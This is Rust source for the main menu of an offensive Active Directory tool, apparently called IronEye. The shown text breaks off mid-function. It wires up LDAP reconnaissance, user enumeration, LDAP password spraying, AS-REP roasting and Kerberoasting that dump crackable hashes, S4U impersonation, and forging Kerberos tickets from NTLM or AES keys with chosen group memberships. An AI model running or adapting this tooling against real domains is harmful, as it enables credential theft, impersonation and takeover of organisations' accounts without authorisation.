const LOGO: &str = r#"
░▒▓█▓▒░  ░▒▓███████▓▒░    ░▒▓██████▓▒░    ░▒▓███████▓▒░  ░▒▓████████▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓████████▓▒░ 
░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░        
░▒▓█▓▒░ ░▒▓███████▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓██████▓▒░     ░▒▓██████▓▒░  ░▒▓██████▓▒░   
░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░            ░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░   ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓████████▓▒░     ░▒▓█▓▒░     ░▒▓████████▓▒░ 

Multi-purpose LDAP/Kerberos tool | By: Evasive_Ginger
Native Cerberos library for Kerberos protocol attacks
"#;

use cerbero_lib;
use dialoguer::{theme::ColorfulTheme, Confirm, Select};
use ironeye::{args, commands, debug, help, kerberos, ldap, ldapping, spray};
use std::net::IpAddr;

use args::{calculate_kerberos_hash, get_cerbero_args, CerberoCommand};
use args::{
    get_connect_arguments, get_spray_arguments, get_userenum_arguments, run_nested_query_menu,
};
use help::*;
use spray::*;

pub fn track_history(module: &str, command: &str) {
    if let Ok(manager) = ironeye::history::HistoryManager::new() {
        let _ = manager.add(module, command);
    }
}

const MAIN_OPTIONS: &[&str] = &[
    "Connect (LDAP Reconissance)",
    "Cerberos (Kerberos Protocol Attacks)",
    "User Enumeration (LDAP Ping Method)",
    "Password Spray (LDAP)",
    "Generate KRB5 Conf",
    "History Management",
    "Debug Settings",
    "Version",
    "Help",
    "Exit",
];

const CMD_OPTIONS: &[&str] = &[
    "Get SID/GUID",
    "From SID/GUID",
    "Get Domain Controllers",
    "Get SPNs",
    "Get ACE/DACL",
    "Machine Quota",
    "Net Commands",
    "Password Policy",
    "Deep-Queries",
    "Custom Ldap Query",
    "Actions",
    "Help",
    "Back",
];

fn main() {
    println!("{}", LOGO);

    let debug_level = debug::get_debug_level();
    if debug_level > 0 {
        kerberos::set_cerbero_verbosity(debug_level);
    }

    loop {
        add_terminal_spacing(1);
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Choose an option")
            .default(0)
            .items(MAIN_OPTIONS)
            .interact()
            .expect("Failed to display menu");

        match selection {
            0 => handle_connect(),
            1 => handle_cerbero(),
            2 => handle_user_enumeration(),
            3 => handle_password_spray(),
            4 => handle_krb5_config(),
            5 => handle_history_management(),
            6 => handle_debug_settings(),
            7 => println!("v{}", env!("CARGO_PKG_VERSION")),
            8 => show_help_main(),
            9 => {
                if confirm_exit() {
                    break;
                }
            }
            _ => unreachable!(),
        }
    }
}

fn handle_connect() {
    let Some(mut ldap_config) = get_connect_arguments() else {
        println!("Required arguments not provided!");
        return;
    };

    let (ldap, search_base) = match ldap::ldap_connect(&mut ldap_config) {
        Ok(conn) => conn,
        Err(e) => {
            let error_msg = e.to_string();
            eprintln!("[!] Failed to connect to LDAP server: {}", e);

            if ldap_config.secure_ldaps
                && (error_msg.contains("TLS")
                    || error_msg.contains("tls")
                    || error_msg.contains("EOF during handshake"))
            {
                eprintln!("[!] Try without -s flag or use Kerberos auth");
            } else if ldap_config.kerberos {
                eprintln!("[!] Kerberos auth failed. Obtain a TGT first: ask-tgt -u <user> -p <pass> -d {} -i <dc>", ldap_config.domain);
            }
            return;
        }
    };

    println!("\nSuccessfully connected to LDAP server.\n");
    run_command_menu(&mut ldap_config, ldap, search_base);
}

fn run_command_menu(
    ldap_config: &mut ldap::LdapConfig,
    mut ldap: ldap3::LdapConn,
    search_base: String,
) {
    loop {
        let prompt = help::get_prompt_string(
            &ldap_config.username,
            &ldap_config.domain,
            ldap_config.secure_ldaps,
            ldap_config.kerberos,
            &ldap_config.dc_ip,
        );

        let cmd_selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt(prompt)
            .items(CMD_OPTIONS)
            .default(0)
            .interact()
            .expect("Failed to display command menu");

        add_terminal_spacing(2);

        let result = match cmd_selection {
            0 => handle_get_sid_guid(&mut ldap, &search_base, ldap_config),
            1 => handle_from_sid_guid(&mut ldap, &search_base, ldap_config),
            2 => commands::get_dcs::get_domain_controllers(&mut ldap, &search_base, ldap_config),
            3 => {
                commands::getspns::get_service_principal_names(&mut ldap, &search_base, ldap_config)
            }
            4 => handle_get_acedacl(&mut ldap, &search_base, ldap_config),
            5 => commands::maq::get_machine_account_quota(&mut ldap, &search_base, ldap_config),
            6 => handle_net_commands(&mut ldap, &search_base, ldap_config),
            7 => commands::getpasspol::get_password_policy(&mut ldap, &search_base, ldap_config),
            8 => run_nested_query_menu(&mut ldap, &search_base, ldap_config).map_err(|e| e.into()),
            9 => commands::customldap::custom_ldap_query(&mut ldap, &search_base, ldap_config),
            10 => commands::actions::run_actions_menu(&mut ldap, &search_base, ldap_config),
            11 => {
                show_help_connect();
                Ok(())
            }
            12 => break,
            _ => unreachable!(),
        };

        if let Err(e) = result {
            let error_msg = e.to_string();
            eprintln!("Error: {}", e);

            if is_connection_error(&error_msg) {
                eprintln!("\n[!] Session expired or connection lost");

                let reconnect = Confirm::with_theme(&ColorfulTheme::default())
                    .with_prompt("Reconnect to LDAP server?")
                    .default(true)
                    .interact()
                    .unwrap_or(false);

                if reconnect {
                    match attempt_reconnect(ldap_config) {
                        Ok(new_ldap) => {
                            println!("[+] Successfully reconnected to LDAP server.\n");
                            ldap = new_ldap;

                            let retry = Confirm::with_theme(&ColorfulTheme::default())
                                .with_prompt("Retry last command?")
                                .default(true)
                                .interact()
                                .unwrap_or(false);

                            if retry {
                                let retry_result = match cmd_selection {
                                    0 => handle_get_sid_guid(&mut ldap, &search_base, ldap_config),
                                    1 => handle_from_sid_guid(&mut ldap, &search_base, ldap_config),
                                    2 => commands::get_dcs::get_domain_controllers(
                                        &mut ldap,
                                        &search_base,
                                        ldap_config,
                                    ),
                                    3 => commands::getspns::get_service_principal_names(
                                        &mut ldap,
                                        &search_base,
                                        ldap_config,
                                    ),
                                    4 => handle_get_acedacl(&mut ldap, &search_base, ldap_config),
                                    5 => commands::maq::get_machine_account_quota(
                                        &mut ldap,
                                        &search_base,
                                        ldap_config,
                                    ),
                                    6 => handle_net_commands(&mut ldap, &search_base, ldap_config),
                                    7 => commands::getpasspol::get_password_policy(
                                        &mut ldap,
                                        &search_base,
                                        ldap_config,
                                    ),
                                    8 => {
                                        run_nested_query_menu(&mut ldap, &search_base, ldap_config)
                                            .map_err(|e| e.into())
                                    }
                                    9 => commands::customldap::custom_ldap_query(
                                        &mut ldap,
                                        &search_base,
                                        ldap_config,
                                    ),
                                    10 => commands::actions::run_actions_menu(
                                        &mut ldap,
                                        &search_base,
                                        ldap_config,
                                    ),
                                    _ => Ok(()),
                                };

                                if let Err(e) = retry_result {
                                    eprintln!("Error on retry: {}", e);
                                }
                            }
                        }
                        Err(e) => {
                            eprintln!("[!] Failed to reconnect: {}", e);
                            eprintln!("[!] Returning to main menu.\n");
                            break;
                        }
                    }
                } else {
                    eprintln!("[!] Returning to main menu.\n");
                    break;
                }
            }
        }
    }
}

fn handle_get_sid_guid(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    ldap_config: &ldap::LdapConfig,
) -> Result<(), Box<dyn std::error::Error>> {
    let Some(target) = read_input_with_history("Enter target object: ", "get-sid-guid") else {
        return Ok(());
    };
    if !target.is_empty() {
        track_history("get-sid-guid", &target);
        commands::get_sid_guid::query_sid_guid(ldap, search_base, ldap_config, &target)?;
    }
    Ok(())
}

fn handle_from_sid_guid(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    _ldap_config: &ldap::LdapConfig,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("SID Ex:  S-1-5-21-123456789-234567890-345678901-1001");
    println!("GUID Ex: 550e8400-e29b-41d4-a716-446655440000\n");

    let Some(target) = read_input_with_history("Enter SID/GUID: ", "from-sid-guid") else {
        return Ok(());
    };
    if !target.is_empty() {
        track_history("from-sid-guid", &target);
        commands::from_sid_guid::resolve_sid_guid(ldap, search_base, &target)?;
    }
    Ok(())
}

fn handle_get_acedacl(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    ldap_config: &ldap::LdapConfig,
) -> Result<(), Box<dyn std::error::Error>> {
    let Some(username) = read_input_with_history("Enter username to analyze: ", "ace-dacl") else {
        return Ok(());
    };
    if !username.is_empty() {
        track_history("ace-dacl", &username);
        commands::get_acedacl::get_ace_dacl(ldap, search_base, ldap_config, &username)?;
    }
    Ok(())
}

fn handle_net_commands(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    ldap_config: &ldap::LdapConfig,
) -> Result<(), Box<dyn std::error::Error>> {
    let Some(input) = read_input_with_history(
        "Enter net command (e.g., user administrator, group \"Domain Admins\", computer DC01$): ",
        "net",
    ) else {
        return Ok(());
    };
    track_history("net", &input);
    let args = parse_quoted_args(&input);

    if args.len() < 2 {
        eprintln!("Error: net command requires type and name");
        eprintln!("Usage: net <user|group|computer> <name>");
        return Ok(());
    }

    let command_type = args[0].to_lowercase();
    if !matches!(command_type.as_str(), "user" | "group" | "computer") {
        eprintln!("Error: net command type must be 'user', 'group', or 'computer'");
        eprintln!("Usage: net <user|group|computer> <name>");
        return Ok(());
    }

    let name = args[1].trim_matches('"');
    commands::net::net_command(ldap, search_base, ldap_config, &command_type, name)?;
    Ok(())
}

fn handle_cerbero() {
    // Set cerbero_lib verbosity based on current debug level
    let debug_level = debug::get_debug_level();
    kerberos::set_cerbero_verbosity(debug_level);

    // Show note about debug verbosity on first entry
    if debug_level == 0 {
        println!("\n[*] Note: For verbose Kerberos output, set Debug level in main menu before entering Cerberos.");
        println!("    Debug Settings → Level 1 (Info) or Level 2 (Debug) for detailed logging.");
        println!("    Restart IronEye to reset the debug level for Kerberos module.\n");
    }

    match get_cerbero_args() {
        CerberoCommand::AskTgt {
            username,
            password,
            domain,
            dc_ip,
            output,
            hash,
        } => {
            track_history("ask-tgt", &format!("{}@{}", username, domain));
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = kerberos::KerberosOps::new(&domain, ip);

            let result = if let Some(hash_value) = hash {
                ops.ask_tgt_hash(&username, &hash_value, &output)
            } else {
                ops.ask_tgt(&username, &password, &output)
            };

            match result {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AskTgs {
            username,
            password,
            domain,
            dc_ip,
            service,
            output,
        } => {
            track_history(
                "ask-tgs",
                &format!("{}@{} -> {}", username, domain, service),
            );
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = kerberos::KerberosOps::new(&domain, ip);

            match ops.ask_tgs(&username, &password, &service, &output) {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AskS4u2self {
            username,
            password,
            domain,
            dc_ip,
            impersonate,
            output,
        } => {
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = kerberos::KerberosOps::new(&domain, ip);

            match ops.ask_s4u2self(&username, &password, &impersonate, &output) {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AskS4u2proxy {
            username,
            password,
            domain,
            dc_ip,
            impersonate,
            service,
            output,
        } => {
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = kerberos::KerberosOps::new(&domain, ip);

            match ops.ask_s4u2proxy(&username, &password, &impersonate, &service, &output) {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AsrepRoast {
            domain,
            dc_ip,
            target,
            output,
            format,
        } => {
            track_history("asrep-roast", &format!("{}", target));
            use std::path::Path;

            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let ops = kerberos::KerberosOps::new(&domain, ip);

            let crack_format = if format == "john" {
                cerbero_lib::CrackFormat::John
            } else {
                cerbero_lib::CrackFormat::Hashcat
            };

            let hashes = if Path::new(&target).exists() {
                match ops.asreproast_file(&target, crack_format) {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            } else {
                match ops.asreproast_user(&target, crack_format) {
                    Ok(h) => vec![h],
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            };

            if let Some(output_file) = output {
                use std::fs::File;
                use std::io::Write;

                match File::create(&output_file) {
                    Ok(mut file) => {
                        for hash in &hashes {
                            writeln!(file, "{}", hash).ok();
                        }
                        println!("\x1b[32m[+] Hashes saved to: {}\x1b[0m", output_file);
                    }
                    Err(e) => eprintln!("\x1b[31m[!] Failed to write output: {}\x1b[0m", e),
                }
            } else {
                for hash in &hashes {
                    println!("{}", hash);
                }
            }

            if !hashes.is_empty() {
                println!("\x1b[32m[+] AS-REP roasting complete\x1b[0m");
            }
        }
        CerberoCommand::Kerberoast {
            username,
            password,
            domain,
            dc_ip,
            target,
            output,
            format,
        } => {
            track_history("kerberoast", &format!("{}", target));
            use std::path::Path;

            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = kerberos::KerberosOps::new(&domain, ip);

            let crack_format = if format == "john" {
                cerbero_lib::CrackFormat::John
            } else {
                cerbero_lib::CrackFormat::Hashcat
            };

            let hashes = if Path::new(&target).exists() {
                match ops.kerberoast_file(&username, &password, &target, crack_format) {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            } else {
                let parts: Vec<&str> = target.split(':').collect();
                if parts.len() != 2 {
                    eprintln!("\x1b[31m[!] Invalid target format. Use 'user:spn' or provide a file\x1b[0m");
                    return;
                }

                match ops.kerberoast_service(&username, &password, parts[0], parts[1], crack_format)
                {
                    Ok(h) => vec![h],
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            };

            if let Some(output_file) = output {
                use std::fs::File;
                use std::io::Write;

                match File::create(&output_file) {
                    Ok(mut file) => {
                        for hash in &hashes {
                            writeln!(file, "{}", hash).ok();
                        }
                        println!("\x1b[32m[+] Hashes saved to: {}\x1b[0m", output_file);
                    }
                    Err(e) => eprintln!("\x1b[31m[!] Failed to write output: {}\x1b[0m", e),
                }
            } else {
                for hash in &hashes {
                    println!("{}", hash);
                }
            }

            if !hashes.is_empty() {
                println!(
                    "\x1b[32m[+] Kerberoast complete: {} hash(es)\x1b[0m",
                    hashes.len()
                );
            }
        }
        CerberoCommand::Convert {
            input,
            output,
            format,
        } => {
            use cerbero_lib::{CredFormat, FileVault, Vault};
            use std::path::Path;

            if !Path::new(&input).exists() {
                eprintln!("\x1b[31m[!] Input file not found: {}\x1b[0m", input);
                return;
            }

            let in_vault = FileVault::new(input.clone());

            let tickets = match in_vault.dump() {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("\x1b[31m[!] Failed to read input file: {}\x1b[0m", e);
                    return;
                }
            };

            if tickets.is_empty() {
                eprintln!("\x1b[31m[!] Input file is empty or contains no valid tickets\x1b[0m");
                return;
            }

            let in_format = match in_vault.support_cred_format() {
                Ok(Some(f)) => f,
                _ => {
                    eprintln!("\x1b[31m[!] Unable to detect input file format\x1b[0m");
                    return;
                }
            };

            println!("[*] Read {} with {} format", input, in_format);

            let out_format = if let Some(fmt) = format {
                match fmt.as_str() {
                    "krb" => CredFormat::Krb,
                    "ccache" => CredFormat::Ccache,
                    "auto" => {
                        if let Some(detected) = CredFormat::from_file_extension(&output) {
                            println!(
                                "[*] Detected {} format from output file extension",
                                detected
                            );
                            detected
                        } else {
                            println!("[*] No extension detected, using opposite of input format");
                            in_format.contrary()
                        }
                    }
                    _ => {
                        eprintln!("\x1b[31m[!] Invalid format\x1b[0m");
                        return;
                    }
                }
            } else {
                if let Some(detected) = CredFormat::from_file_extension(&output) {
                    println!(
                        "[*] Detected {} format from output file extension",
                        detected
                    );
                    detected
                } else {
                    println!("[*] No extension detected, using opposite of input format");
                    in_format.contrary()
                }
            };

            let out_vault = FileVault::new(output.clone());
            match out_vault.save_as(tickets, out_format) {
                Ok(_) => {
                    println!("[*] Saved {} with {} format", output, out_format);
                    println!("\x1b[32m[+] Conversion complete\x1b[0m");
                }
                Err(e) => {
                    eprintln!("\x1b[31m[!] Failed to save output file: {}\x1b[0m", e);
                }
            }
        }
        CerberoCommand::Craft {
            user,
            sid,
            user_rid,
            service,
            key_type,
            key_value,
            groups,
            output,
            format,
        } => {
            use cerbero_lib::{
                craft_ticket_info, CredFormat, FileVault, KrbUser, TicketCreds, Vault,
            };
            use kerberos_crypto::Key;
            use ms_pac::PISID;
            use std::convert::TryInto;

            let krb_user: KrbUser = match user.as_str().try_into() {
                Ok(u) => u,
                Err(e) => {
                    eprintln!("\x1b[31m[!] Invalid user format: {}\x1b[0m", e);
                    return;
                }
            };

            let realm_sid: PISID = match sid.as_str().try_into() {
                Ok(s) => s,
                Err(_) => {
                    eprintln!("\x1b[31m[!] Invalid SID format: {}\x1b[0m", sid);
                    return;
                }
            };

            let user_key = match key_type.to_lowercase().as_str() {
                "password" => Key::Secret(key_value),
                "rc4" | "ntlm" => {
                    let key_bytes = match hex::decode(&key_value) {
                        Ok(b) => b,
                        Err(_) => {
                            eprintln!("\x1b[31m[!] Invalid RC4/NTLM hash\x1b[0m");
                            return;
                        }
                    };
                    match key_bytes.try_into() {
                        Ok(k) => Key::RC4Key(k),
                        Err(_) => {
                            eprintln!("\x1b[31m[!] RC4 key must be 16 bytes (32 hex chars)\x1b[0m");
                            return;
                        }
                    }
                }
                "aes128" => {
                    let key_bytes = match hex::decode(&key_value) {
                        Ok(b) => b,
                        Err(_) => {
                            eprintln!("\x1b[31m[!] Invalid AES128 key\x1b[0m");
                            return;
                        }
                    };
                    match key_bytes.try_into() {
                        Ok(k) => Key::AES128Key(k),
                        Err(_) => {
                            eprintln!(
                                "\x1b[31m[!] AES128 key must be 16 bytes (32 hex chars)\x1b[0m"
                            );
                            return;
                        }
                    }
                }
                "aes256" | "aes" => {
                    let key_bytes = match hex::decode(&key_value) {
                        Ok(b) => b,
                        Err(_) => {
                            eprintln!("\x1b[31m[!] Invalid AES256 key\x1b[0m");
                            return;
                        }
                    };
                    match key_bytes.try_into() {
                        Ok(k) => Key::AES256Key(k),
                        Err(_) => {
                            eprintln!(
                                "\x1b[31m[!] AES256 key must be 32 bytes (64 hex chars)\x1b[0m"
                            );
                            return;
                        }
                    }
                }
                _ => {
                    eprintln!("\x1b[31m[!] Invalid key type. Use: password, rc4, aes128, or aes256\x1b[0m");
                    return;
                }
            };

            let cred_format = match format.to_lowercase().as_str() {
                "krb" => CredFormat::Krb,
                "ccache" => CredFormat::Ccache,
                _ => {
                    eprintln!("\x1b[31m[!] Invalid format. Use 'ccache' or 'krb'\x1b[0m");
                    return;
                }
            };

            println!("[*] Crafting ticket...");

            let ticket_info = craft_ticket_info(
                krb_user.clone(),
                service.clone(),
                user_key,
                user_rid,
                realm_sid,
                &groups,
                None,
            );

            let krb_cred = TicketCreds::new(vec![ticket_info]);
            let vault = FileVault::new(output.clone());

            match vault.save_as(krb_cred, cred_format) {
                Ok(_) => {
                    if let Some(ref spn) = service {
                        println!("[*] Saved {} TGS for {} in {}", krb_user.name, spn, output);
                    } else {
                        println!("[*] Saved {} TGT in {}", krb_user.name, output);
                    }
                    println!("\x1b[32m[+] Ticket crafted successfully\x1b[0m");
                }
                Err(e) => {
                    eprintln!("\x1b[31m[!] Failed to save ticket: {:?}\x1b[0m", e);
                }
            }
        }
        CerberoCommand::Export(path) => {
            println!("[+] KRB5CCNAME environment variable set to: {}", path);
            std::env::set_var("KRB5CCNAME", path);
        }
        CerberoCommand::List { filepath } => {
            #[cfg(windows)]
            let result = cerbero_lib::commands::list(Some(filepath), false, false, None, false);
            #[cfg(not(windows))]
            let result = cerbero_lib::commands::list(Some(filepath), false, false, None);

            if let Err(e) = result {
                eprintln!("\x1b[31m[!] Error listing ccache: {}\x1b[0m", e);
            }
        }
        CerberoCommand::Hash => {
            calculate_kerberos_hash();
        }
        CerberoCommand::None => {}
    }
}

fn handle_user_enumeration() {
    let Some(args) = get_userenum_arguments() else {
        println!("Invalid arguments provided!");
        return;
    };

    println!("\nConfiguration:");
    println!("User file: {}", args.userfile);
    println!("Domain: {}", args.domain);
    println!("DC IP: {}", args.dc_ip);
    println!(
        "Output file: {}",
        args.output.as_deref().unwrap_or("None (stdout)")
    );
    if args.timestamp_format {
        println!("Timestamp formatting: Enabled");
    }

    println!("\nStarting enumeration...");
    if let Err(e) = ldapping::run(&args) {
        eprintln!("Error during enumeration: {}", e);
    }
    println!("\nUser enumeration complete.");
    add_terminal_spacing(2);
}

fn handle_password_spray() {
    let Some(args) = get_spray_arguments() else {
        println!("Required arguments not provided!");
        println!("Usage: --users <usernames/users_file> --passwords <password/passwords_file> --domain <domain> --dc-ip <ip>");
        return;
    };

    println!("Using username/users file: {}", args.userfile);
    println!("Using password/passwords file: {}", args.password);

    match SprayConfig::from_args(&args) {
        Ok(spray_config) => {
            if let Err(e) = spray::start_password_spray(spray_config) {
                eprintln!("Error during password spray: {}", e);
            }
        }
        Err(e) => eprintln!("Error parsing arguments: {}", e),
    }
}

fn handle_krb5_config() {
    println!("KRB5 Config Generator");

    let host = read_input("Enter IP address (e.g. 10.0.0.1): ");
    let hostname = read_input("Enter hostname (e.g. dc1): ");
    let domain = read_input("Enter domain (e.g. example.local): ");
    let is_dc_input = read_input("Is this a Domain Controller? (y/n): ");
    let is_dc = is_dc_input.eq_ignore_ascii_case("y");

    let args = ConfGenArgs {
        host,
        hostname,
        domain,
        is_dc,
    };
    if let Err(e) = generate_conf_files(&args) {
        eprintln!("Error generating config files: {}", e);
    }
}

fn handle_history_management() {
    use ironeye::history::HistoryManager;

    const HISTORY_OPTIONS: &[&str] = &[
        "View Recent Commands (All Modules)",
        "Search History",
        "View Statistics",
        "Clear Module History",
        "Cleanup Old Entries (>30 days)",
        "Export History to File",
        "Clear All History",
        "Back to Main Menu",
    ];

    loop {
        add_terminal_spacing(1);
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("History Management")
            .items(HISTORY_OPTIONS)
            .default(0)
            .interact()
            .expect("Failed to display history menu");

        let manager = match HistoryManager::new() {
            Ok(m) => m,
            Err(e) => {
                eprintln!("[!] Failed to access history: {}", e);
                return;
            }
        };

        match selection {
            0 => {
                // View Recent Commands
                let limit_str = read_input("Number of commands to show (default: 20): ");
                let limit: usize = limit_str.parse().unwrap_or(20);

                match manager.get_all_recent(limit) {
                    Ok(entries) => {
                        if entries.is_empty() {
                            println!("\n[*] No history entries found.");
                        } else {
                            println!("\n=== Recent Commands ===");
                            for (module, command, timestamp) in entries {
                                let dt = chrono::DateTime::from_timestamp(timestamp, 0)
                                    .unwrap_or_else(|| chrono::Utc::now());
                                println!(
                                    "[{}] [{}] {}",
                                    dt.format("%Y-%m-%d %H:%M:%S"),
                                    module,
                                    command
                                );
                            }
                        }
                    }
                    Err(e) => eprintln!("[!] Error retrieving history: {}", e),
                }
            }
            1 => {
                // Search History
                let pattern = read_input("Enter search term: ");
                if !pattern.is_empty() {
                    match manager.search(&pattern) {
                        Ok(results) => {
                            if results.is_empty() {
                                println!("\n[*] No matches found for '{}'", pattern);
                            } else {
                                println!("\n=== Search Results for '{}' ===", pattern);
                                for (module, command, timestamp) in results {
                                    let dt = chrono::DateTime::from_timestamp(timestamp, 0)
                                        .unwrap_or_else(|| chrono::Utc::now());
                                    println!(
                                        "[{}] [{}] {}",
                                        dt.format("%Y-%m-%d %H:%M:%S"),
                                        module,
                                        command
                                    );
                                }
                            }
                        }
                        Err(e) => eprintln!("[!] Error searching history: {}", e),
                    }
                }
            }
            2 => {
                // View Statistics
                match manager.get_stats() {
                    Ok(stats) => {
                        if stats.is_empty() {
                            println!("\n[*] No history entries found.");
                        } else {
                            println!("\n=== History Statistics ===");
                            let total: usize = stats.iter().map(|(_, count)| count).sum();
                            println!("Total commands: {}\n", total);
                            for (module, count) in stats {
                                let percentage = (count as f64 / total as f64) * 100.0;
                                println!("{:12} : {:4} ({:.1}%)", module, count, percentage);
                            }
                        }
                    }
                    Err(e) => eprintln!("[!] Error retrieving statistics: {}", e),
                }
            }
            3 => {
                // Clear Module History
                println!("\nAvailable modules: connect, cerbero, spray, userenum, ldapquery");
                let module = read_input("Enter module name to clear: ");
                if !module.is_empty() {
                    match Confirm::with_theme(&ColorfulTheme::default())
                        .with_prompt(format!("Clear all history for '{}' module?", module))
                        .default(false)
                        .interact()
                    {
                        Ok(true) => match manager.clear_module(&module) {
                            Ok(count) => {
                                println!("[+] Deleted {} entries from '{}'", count, module)
                            }
                            Err(e) => eprintln!("[!] Error clearing module history: {}", e),
                        },
                        Ok(false) => println!("[*] Cancelled"),
                        Err(e) => eprintln!("[!] Error: {}", e),
                    }
                }
            }
            4 => {
                // Cleanup Old Entries
                match Confirm::with_theme(&ColorfulTheme::default())
                    .with_prompt("Delete all entries older than 30 days?")
                    .default(false)
                    .interact()
                {
                    Ok(true) => match manager.cleanup_old(30) {
                        Ok(count) => println!("[+] Deleted {} old entries", count),
                        Err(e) => eprintln!("[!] Error cleaning up history: {}", e),
                    },
                    Ok(false) => println!("[*] Cancelled"),
                    Err(e) => eprintln!("[!] Error: {}", e),
                }
            }
            5 => {
                // Export History
                let filename = read_input("Enter output filename (default: history_export.txt): ");
                let filename = if filename.is_empty() {
                    "history_export.txt".to_string()
                } else {
                    filename
                };

                match manager.export_to_file(&filename) {
                    Ok(count) => println!("[+] Exported {} entries to {}", count, filename),
                    Err(e) => eprintln!("[!] Error exporting history: {}", e),
                }
            }
            6 => {
                // Clear All History
                match Confirm::with_theme(&ColorfulTheme::default())
                    .with_prompt("⚠️  Delete ALL history? This cannot be undone!")
                    .default(false)
                    .interact()
                {
                    Ok(true) => {
                        match Confirm::with_theme(&ColorfulTheme::default())
                            .with_prompt("Are you absolutely sure?")
                            .default(false)
                            .interact()
                        {
                            Ok(true) => match manager.clear_all() {
                                Ok(count) => println!("[+] Deleted {} entries", count),
                                Err(e) => eprintln!("[!] Error clearing history: {}", e),
                            },
                            Ok(false) => println!("[*] Cancelled"),
                            Err(e) => eprintln!("[!] Error: {}", e),
                        }
                    }
                    Ok(false) => println!("[*] Cancelled"),
                    Err(e) => eprintln!("[!] Error: {}", e),
                }
            }
            7 => {
                println!("Returning to main menu...");
                break;
            }
            _ => unreachable!(),
        }
    }
}

fn handle_debug_settings() {
    const DEBUG_OPTIONS: &[&str] = &[
        "Disable Debug (Level 0) - Production mode, no debug output",
        "Basic Debug (Level 1) - Basic operations: connections, commands executed",
        "Verbose Debug (Level 2) - Detailed flow: LDAP queries, auth attempts",
        "Full Debug (Level 3) - Complete trace: raw responses, thread operations",
        "Back to Main Menu",
    ];

    loop {
        let current = debug::get_debug_level();
        let prompt = format!("Debug Settings (Current Level: {})", current);

        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt(prompt)
            .items(DEBUG_OPTIONS)
            .default(0)
            .interact()
            .expect("Failed to display debug menu");

        match selection {
            0 => {
                debug::set_debug_level(0);
                println!("[+] Debug disabled");
                add_terminal_spacing(1);
            }
            1 => {
                debug::set_debug_level(1);
                println!("[+] Debug level set to: 1 (Basic)");
                add_terminal_spacing(1);
            }
            2 => {
                debug::set_debug_level(2);
                println!("[+] Debug level set to: 2 (Verbose)");
                add_terminal_spacing(1);
            }
            3 => {
                debug::set_debug_level(3);
                println!("[+] Debug level set to: 3 (Full)");
                add_terminal_spacing(1);
            }
            4 => {
                println!("Returning to main menu...");
                add_terminal_spacing(1);
                break;
            }
            _ => unreachable!(),
        }
    }
}

fn confirm_exit() -> bool {
    match Confirm::with_theme(&ColorfulTheme::default())
        .with_prompt("Are you sure you want to quit?")
        .interact()
    {
        Ok(true) => {
            println!("Goodbye!");
            true
        }
        Ok(false) => {
            println!("Returning to the menu...");
            false
        }
        Err(_) => false,
    }
}

fn is_connection_error(error_msg: &str) -> bool {
    error_msg.contains("channel closed")
        || error_msg.contains("Connection reset")
        || error_msg.contains("Broken pipe")
        || error_msg.contains("recv error")
        || error_msg.contains("connection closed")
        || error_msg.contains("EOF")
